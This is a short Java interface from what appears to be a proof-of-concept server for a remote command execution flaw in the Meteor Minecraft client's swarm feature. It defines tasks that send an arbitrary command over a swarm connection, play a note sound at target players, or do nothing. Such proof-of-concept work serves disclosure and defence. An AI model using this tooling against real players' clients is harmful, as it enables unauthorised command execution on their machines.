package io.github.racoondog.meteor;

import net.minecraft.registry.Registries;
import net.minecraft.registry.entry.RegistryEntry;
import net.minecraft.sound.SoundCategory;
import net.minecraft.sound.SoundEvent;
import net.minecraft.sound.SoundEvents;

import java.io.IOException;
import java.util.concurrent.ThreadLocalRandom;

public interface Task {
    static Task command(String command) {
        return connection -> connection.execute(command);
    }

    static Task playNote() {
        return connection -> {
            RegistryEntry<SoundEvent> soundEvent = Registries.SOUND_EVENT.getEntry(SoundEvents.BLOCK_NOTE_BLOCK_IRON_XYLOPHONE.registryKey()).orElseThrow();
            for (var target : MeteorRCEProofOfConceptServer.TARGETS) {
                target.getWorld().playSound(
                        null, target.getX(), target.getY(), target.getZ(), soundEvent, SoundCategory.RECORDS, 3f, 1f, ThreadLocalRandom.current().nextLong()
                );
            }
        };
    }

    static Task noop() {
        return connection -> {};
    }

    void execute(SwarmConnection connection) throws IOException;
}
